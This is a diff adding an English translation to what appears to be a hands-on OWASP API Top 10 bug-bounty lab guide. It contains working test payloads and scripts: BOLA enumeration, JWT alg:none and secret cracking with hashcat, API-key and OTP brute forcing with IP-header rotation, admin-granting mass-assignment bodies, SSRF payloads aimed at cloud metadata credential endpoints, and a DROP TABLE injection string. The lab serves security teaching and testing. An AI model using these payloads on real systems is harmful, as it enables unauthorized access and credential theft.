@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # API 보안 테스트 & 버그바운티 실전
 > AI_Innovation_Studio | OWASP API Top 10 완전 실습 Lab
 
@@ -1089,5 +1095,304 @@ if order.user_id != current_user.id:
 | BOLA | Network | Low | Low | None | **7.5** High |
 | Mass Assignment | Network | Low | Low | None | **8.8** High |
 | SSRF (AWS 메타데이터) | Network | Low | Low | None | **9.8** Critical |
+| JWT alg:none | Network | Low | None | None | **9.1** Critical |
+| Rate Limit OTP | Network | Low | None | None | **7.3** High |
+
+---
+
+<a name="english"></a>
+
+# API Security Testing & Bug Bounty Practical Guide
+
+> AI_Innovation_Studio | OWASP API Top 10 Complete Hands-on Lab
+
+---
+
+## 1. OWASP API Top 10 Overview
+
+API security vulnerabilities differ from traditional web vulnerabilities — they focus on authentication, authorization, and business logic flaws rather than just injection attacks.
+
+```
+OWASP API Top 10 (2023):
+API1  — Broken Object Level Authorization (BOLA/IDOR)
+API2  — Broken Authentication
+API3  — Broken Object Property Level Authorization
+API4  — Unrestricted Resource Consumption
+API5  — Broken Function Level Authorization
+API6  — Unrestricted Access to Sensitive Business Flows
+API7  — Server Side Request Forgery (SSRF)
+API8  — Security Misconfiguration
+API9  — Improper Inventory Management
+API10 — Unsafe Consumption of APIs
+```
+
+---
+
+## 2. API1 — BOLA (Broken Object Level Authorization)
+
+BOLA is the most common API vulnerability — accessing other users' data by changing object IDs.
+
+```bash
+# Basic BOLA test
+GET /api/v1/users/1001/profile      # Your own account
+GET /api/v1/users/1002/profile      # Someone else's account ← BOLA if accessible
+
+# BOLA in orders
+GET /api/orders/ORD-2024-001        # Your order
+GET /api/orders/ORD-2024-002        # Someone else's order
+
+# BOLA test with Python
+import requests
+
+def test_bola(base_url: str, auth_token: str, user_ids: list) -> list:
+    """BOLA vulnerability test"""
+    results = []
+    headers = {"Authorization": f"Bearer {auth_token}"}
+    
+    for uid in user_ids:
+        resp = requests.get(f"{base_url}/api/users/{uid}", headers=headers)
+        if resp.status_code == 200:
+            results.append({
+                "user_id": uid,
+                "status": "BOLA - Accessible",
+                "data_preview": resp.text[:100]
+            })
+    
+    return results
+```
+
+---
+
+## 3. API2 — Broken Authentication
+
+```bash
+# JWT vulnerability tests
+
+# 1. JWT alg:none attack
+# Modify header: {"alg":"none","typ":"JWT"}
+# Remove signature
+
+# 2. Weak secret key cracking
+hashcat -a 0 -m 16500 jwt_token.txt rockyou.txt
+
+# 3. JWT key confusion (RS256 → HS256)
+# Sign with server's RSA public key as HMAC secret
+
+# 4. JWT expiry not validated
+# Modify exp claim to past date and send
+
+# API Key brute force (rate limit check)
+for key in $(cat api_keys.txt); do
+    response=$(curl -s -o /dev/null -w "%{http_code}" \
+        -H "X-API-Key: $key" \
+        https://api.target.com/v1/users)
+    if [ "$response" = "200" ]; then
+        echo "Valid API Key: $key"
+    fi
+done
+```
+
+---
+
+## 4. API3 — Mass Assignment
+
+Mass assignment occurs when API automatically binds all request body fields to model properties.
+
+```bash
+# Normal registration request
+POST /api/register
+{"username": "user1", "password": "pass123", "email": "user@example.com"}
+
+# Mass assignment attack — add admin or role field
+POST /api/register
+{"username": "attacker", "password": "pass", "email": "a@a.com", "role": "admin"}
+
+# Or in profile update
+PUT /api/users/profile
+{"name": "Test", "isAdmin": true, "balance": 999999}
+
+# Discovery method: check API docs, JS files, error messages
+curl -s https://api.target.com/api/docs | grep -i "schema\|properties\|model"
+```
+
+---
+
+## 5. API4 — Rate Limit Testing
+
+```python
+import requests
+import time
+from concurrent.futures import ThreadPoolExecutor
+
+def test_rate_limit(url: str, token: str, requests_count: int = 100) -> dict:
+    """Rate limit vulnerability test"""
+    
+    headers = {"Authorization": f"Bearer {token}"}
+    results = {"success": 0, "rate_limited": 0, "errors": 0}
+    
+    def send_request(_):
+        try:
+            resp = requests.post(url, headers=headers, json={"otp": "123456"}, timeout=5)
+            if resp.status_code == 200:
+                results["success"] += 1
+            elif resp.status_code == 429:
+                results["rate_limited"] += 1
+            else:
+                results["errors"] += 1
+        except:
+            results["errors"] += 1
+    
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        executor.map(send_request, range(requests_count))
+    
+    return results
+
+# Rate limit bypass techniques:
+# X-Forwarded-For: 1.2.3.4 (change per request)
+# X-Real-IP header rotation
+# Null byte in path: /api/login%00
+```
+
+---
+
+## 6. API7 — SSRF Testing
+
+```bash
+# Basic SSRF test
+POST /api/webhook
+{"url": "http://169.254.169.254/latest/meta-data/"}  # AWS metadata
+
+# Cloud metadata endpoints
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
+http://169.254.169.254/metadata/v1/  # Azure
+
+# SSRF bypass techniques
+http://127.0.0.1/admin           # direct
+http://[::1]/admin               # IPv6
+http://0x7f000001/admin          # hex
+http://017700000001/admin        # octal
+http://127.1/admin               # short form
+
+# Blind SSRF (DNS callback)
+{"url": "http://your-burp-collaborator.com/ssrf-test"}
+```
+
+---
+
+## 7. GraphQL Security Testing
+
+```bash
+# Introspection query (schema extraction)
+POST /graphql
+{
+  "query": "{ __schema { types { name fields { name } } } }"
+}
+
+# Disable introspection check
+POST /graphql
+{"query": "{__schema{types{name}}}"}
+
+# GraphQL injection
+{"query": "{ user(id: \"1; DROP TABLE users--\") { name } }"}
+
+# Batching attack (rate limit bypass)
+POST /graphql
+[
+  {"query": "mutation { login(user: \"admin\", pass: \"pass1\") { token } }"},
+  {"query": "mutation { login(user: \"admin\", pass: \"pass2\") { token } }"}
+]
+```
+
+---
+
+## 8. API Security Testing Tools
+
+```bash
+# Postman — API testing
+# Import OpenAPI/Swagger spec → auto-generate test cases
+
+# Insomnia — REST/GraphQL client
+
+# kiterunner — API endpoint discovery
+kr scan https://api.target.com -w routes-large.kite
+
+# Arjun — hidden parameter discovery
+arjun -u https://api.target.com/endpoint
+
+# APIKit (Burp extension) — API security testing
+```
+
+---
+
+## 9. Automation Script
+
+```python
+#!/usr/bin/env python3
+"""
+API Security Testing Automation Script
+Tests OWASP API Top 10 vulnerabilities
+"""
+import requests
+import json
+from typing import Optional
+
+class APISecurityTester:
+    def __init__(self, base_url: str, auth_token: Optional[str] = None):
+        self.base_url = base_url.rstrip('/')
+        self.session = requests.Session()
+        if auth_token:
+            self.session.headers['Authorization'] = f'Bearer {auth_token}'
+        self.findings = []
+    
+    def test_bola(self, endpoint: str, id_range: range) -> list:
+        """BOLA/IDOR test"""
+        vulnerable = []
+        for obj_id in id_range:
+            resp = self.session.get(f"{self.base_url}{endpoint}/{obj_id}")
+            if resp.status_code == 200:
+                vulnerable.append({
+                    "id": obj_id,
+                    "url": f"{self.base_url}{endpoint}/{obj_id}",
+                    "type": "BOLA"
+                })
+        return vulnerable
+    
+    def test_mass_assignment(self, endpoint: str, 
+                              base_data: dict, 
+                              extra_fields: dict) -> dict:
+        """Mass assignment test"""
+        payload = {**base_data, **extra_fields}
+        resp = self.session.post(f"{self.base_url}{endpoint}", json=payload)
+        return {
+            "endpoint": endpoint,
+            "payload": payload,
+            "status": resp.status_code,
+            "response": resp.text[:200]
+        }
+    
+    def generate_report(self) -> str:
+        """Generate test results report"""
+        report = f"# API Security Test Report\n\n"
+        report += f"Target: {self.base_url}\n"
+        report += f"Total Findings: {len(self.findings)}\n\n"
+        
+        for finding in self.findings:
+            report += f"## [{finding.get('severity', 'MEDIUM')}] {finding.get('type')}\n"
+            report += f"URL: {finding.get('url')}\n"
+            report += f"Details: {finding.get('details')}\n\n"
+        
+        return report
+```
+
+---
+
+## 10. CVSS Score Calculation Examples
+
+| Vulnerability | Attack Vector | Complexity | Privileges | User Interaction | CVSS |
+|--------------|--------------|-----------|-----------|-----------------|------|
+| BOLA | Network | Low | Low | None | **7.5** High |
+| Mass Assignment | Network | Low | Low | None | **8.8** High |
+| SSRF (AWS Metadata) | Network | Low | Low | None | **9.8** Critical |
 | JWT alg:none | Network | Low | None | None | **9.1** Critical |
 | Rate Limit OTP | Network | Low | None | None | **7.3** High |
